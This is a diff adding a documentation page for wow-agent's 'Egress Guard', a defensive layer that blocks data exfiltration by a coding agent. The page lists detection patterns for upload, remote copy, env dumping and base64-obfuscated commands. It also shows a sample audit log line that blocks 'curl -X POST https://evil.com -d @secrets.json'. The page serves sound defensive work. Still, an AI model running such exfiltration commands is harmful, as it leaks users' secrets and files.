@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Egress Guard | wow-agent</title>
+    <meta name="description" content="How wow-agent detects and blocks data exfiltration attempts — patterns, heuristics, allowlists and the audit log." />
+    <link rel="canonical" href="https://uuzjw.github.io/safety/egress-guard/" />
+    <meta name="theme-color" content="#1d4ed8" />
+    
+      <link rel="icon" href="https://uuzjw.github.io/assets/favicon.png" />
+    
+    <meta property="og:title" content="Egress Guard | wow-agent" />
+    <meta property="og:description" content="How wow-agent detects and blocks data exfiltration attempts — patterns, heuristics, allowlists and the audit log." />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="wow-agent" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="../../assets/css/site.css" />
+    <script>
+      (function () {
+        var t = localStorage.getItem("wow-theme") || "dark";
+        document.documentElement.dataset.theme = t;
+      })();
+    </script>
+  </head>
+  <body class="wow-body">
+    
+
+
+
+
+
+
+
+<header class="site-header">
+  <div class="shell header-inner">
+    
+      <a class="brand" href="../../index.html">
+    
+      <img class="brand-logo" src="../../assets/logo.png" alt="wow-agent logo" width="34" height="34" />
+      <span class="brand-name">wow-agent</span>
+    </a>
+    <nav class="top-nav" aria-label="Primary">
+      
+        <a class="top-nav__link" href="../../guide/index.html">Guide</a>
+        <a class="top-nav__link" href="../../architecture/index.html">Architecture</a>
+        <a class="top-nav__link" href="../../tools/index.html">Tools</a>
+        <a class="top-nav__link" href="../index.html">Safety</a>
+        <a class="top-nav__link" href="../../config/index.html">Config</a>
+        <a class="top-nav__link top-nav__lang" href="../../zh/safety/egress-guard/index.html" title="切换到中文">中文</a>
+      
+      <button class="theme-toggle" id="wow-theme-toggle" aria-label="Toggle theme">☾</button>
+    </nav>
+  </div>
+</header>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    var btn = document.getElementById("wow-theme-toggle");
+    if (!btn) return;
+    var root = document.documentElement;
+    function sync() {
+      btn.textContent = root.dataset.theme === "dark" ? "☀" : "☾";
+    }
+    sync();
+    btn.addEventListener("click", function () {
+      root.dataset.theme = root.dataset.theme === "dark" ? "light" : "dark";
+      localStorage.setItem("wow-theme", root.dataset.theme);
+      sync();
+    });
+  });
+</script>
+
+    <main>
+
+  
+<div class="shell docs-layout">
+  <aside class="docs-side" aria-label="Docs navigation">
+    
+    
+    
+      <div class="side-group">
+        <p class="side-group__title">Product</p>
+        <ul>
+          
+            <li><a class="side-link" href="../../index.html">Home</a></li>
+          
+            <li><a class="side-link" href="../../why/index.html">Why wow-agent</a></li>
+          
+            <li><a class="side-link" href="../../comparison/index.html">Comparison</a></li>
+          
+            <li><a class="side-link" href="../../changelog/index.html">Changelog</a></li>
+          
+        </ul>
+      </div>
+    
+      <div class="side-group">
+        <p class="side-group__title">User Guide</p>
+        <ul>
+          
+            <li><a class="side-link" href="../../guide/index.html">Start Here</a></li>
+          
+            <li><a class="side-link" href="../../guide/installation/index.html">Installation</a></li>
+          
+            <li><a class="side-link" href="../../guide/first-task/index.html">Your First Task</a></li>
+          
+            <li><a class="side-link" href="../../guide/cookbook/index.html">Everyday Cookbook</a></li>
+          
+            <li><a class="side-link" href="../../guide/commands/index.html">Commands</a></li>
+          
+            <li><a class="side-link" href="../../guide/faq/index.html">FAQ</a></li>
+          
+        </ul>
+      </div>
+    
+      <div class="side-group">
+        <p class="side-group__title">Developer Tutorials</p>
+        <ul>
+          
+            <li><a class="side-link" href="../../tutorials/index.html">Overview</a></li>
+          
+            <li><a class="side-link" href="../../tutorials/custom-tools/index.html">Custom Tools</a></li>
+          
+            <li><a class="side-link" href="../../tutorials/add-provider/index.html">Add a Provider</a></li>
+          
+            <li><a class="side-link" href="../../tutorials/mcp-servers/index.html">MCP Servers</a></li>
+          
+            <li><a class="side-link" href="../../tutorials/subagents/index.html">Sub-agents</a></li>
+          
+            <li><a class="side-link" href="../../tutorials/contributing/index.html">Contributing</a></li>
+          
+        </ul>
+      </div>
+    
+      <div class="side-group">
+        <p class="side-group__title">Reference</p>
+        <ul>
+          
+            <li><a class="side-link" href="../../cli/index.html">CLI Reference</a></li>
+          
+            <li><a class="side-link" href="../../config/index.html">Configuration</a></li>
+          
+            <li><a class="side-link" href="../../architecture/index.html">Architecture</a></li>
+          
+            <li><a class="side-link" href="../../tools/index.html">Tools</a></li>
+          
+            <li><a class="side-link" href="../index.html">Safety</a></li>
+          
+        </ul>
+      </div>
+    
+  </aside>
+
+  <article class="docs-main">
+    <p class="entry-eyebrow">Safety · Layer 2</p>
+    <h1 class="entry-title">Egress Guard</h1>
+    <div class="prose"><p>The egress guard inspects every command before execution and stops data from leaving your machine.</p>
+<h2>Blocked automatically</h2>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Example</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>upload verbs</td>
+<td><code>curl -X POST/-d/-T</code>, <code>wget --post-file</code></td>
+<td>data upload</td>
+</tr>
+<tr>
+<td>remote copy</td>
+<td><code>scp</code>, <code>sftp</code>, <code>rsync … host:</code></td>
+<td>file transfer</td>
+</tr>
+<tr>
+<td>publish</td>
+<td><code>npm publish</code>, <code>docker push</code>, <code>twine upload</code></td>
+<td>package exfiltration</td>
+</tr>
+<tr>
+<td>git egress</td>
+<td><code>git push</code>, <code>git remote add</code> + push</td>
+<td>source leakage</td>
+</tr>
+<tr>
+<td>cloud upload</td>
+<td><code>aws s3 cp … s3://</code>, <code>gcloud storage cp</code></td>
+<td>bucket exfiltration</td>
+</tr>
+</tbody>
+</table>
+<h2>Heuristics on top</h2>
+<ul>
+<li><strong>base64 payloads</strong>: <code>curl -d "$(base64 …)"</code> decoded and inspected</li>
+<li><strong>env dumping</strong>: commands embedding <code>$(env)</code>, <code>$(cat secrets*)</code></li>
+<li><strong>obfuscation</strong>: <code>bash -c "$(echo … | base64 -d)"</code> flagged for confirmation</li>
+<li><strong>pipe-to-network</strong>: <code>cat file | curl -d @- …</code></li>
+</ul>
+<h2>Outcomes</h2>
+<table>
+<thead>
+<tr>
+<th>Outcome</th>
+<th>When</th>
+<th>UX</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>BLOCK</strong></td>
+<td>high-confidence exfiltration</td>
+<td>command refused, logged</td>
+</tr>
+<tr>
+<td><strong>CONFIRM</strong></td>
+<td>ambiguous (e.g. <code>git push</code>)</td>
+<td>typed <code>YES</code> required</td>
+</tr>
+<tr>
+<td><strong>ALLOW</strong></td>
+<td>internal/loopback or allowlisted</td>
+<td>logged for audit</td>
+</tr>
+</tbody>
+</table>
+<h2>Allowlisting legitimate flows</h2>
+<pre><code class="language-bash"># ~/.wow-agent.env
+WOW_CUSTOM_ALLOW_PATTERNS='["registry.internal.corp", "my-deploy-tool"]'
+</code></pre>
+<p>Allowlist entries are regex matched against the command line. Keep them narrow — hostname or tool name, never <code>.*</code>.</p>
+<h2>Audit log</h2>
+<pre><code class="language-text">/safe logs
+[10:30:45] EGRESS_BLOCKED  curl -X POST https://evil.com -d @secrets.json
+[10:31:22] EGRESS_CONFIRM  git push origin feat/auth (user: YES)
+[10:32:10] EGRESS_ALLOWED   curl http://localhost:8000/health
+</code></pre>
+<p>Every decision — including allows — is recorded with the full command line, matched pattern and session id.</p>
+<h2>Testing the guard</h2>
+<pre><code class="language-bash">/safe test                     # built-in self-test
+!curl -X POST https://httpbin.org/post -d x   # should BLOCK
+!git push origin test-branchn                 # should CONFIRM
+</code></pre>
+<h2>Limits</h2>
+<p>The guard inspects <strong>commands</strong>, not program behavior — a compiled binary could theoretically network inside an unsandboxed run. That's what <a href="/wow-agent/safety/network-sandbox/">Layer 1: the network sandbox</a> is for. Defense in depth, always both.</p></div>
+    <nav class="doc-foot">
+      
+        <a class="btn btn--ghost" href="../../index.html">← Home</a>
+        <a class="btn btn--ghost" href="https://github.com/uuzjw/wow-agent/issues" target="_blank" rel="noopener noreferrer">Report Issue</a>
+      
+    </nav>
+  </article>
+</div>
+
+
+</main>
+    
+<footer class="site-footer">
+  <div class="shell footer-inner">
+    
+      <p><strong>wow-agent</strong> — Terminal Coding Agent for Everyone</p>
+    
+    <p class="footer-meta">Copyright © 2026 <a href="https://github.com/uuzjw/wow-agent" target="_blank" rel="noopener noreferrer">uuzjw</a> · <a href="https://github.com/uuzjw/wow-agent/blob/main/LICENSE" target="_blank" rel="noopener noreferrer">MIT License</a></p>
+  </div>
+</footer>
+
+  </body>
+</html>
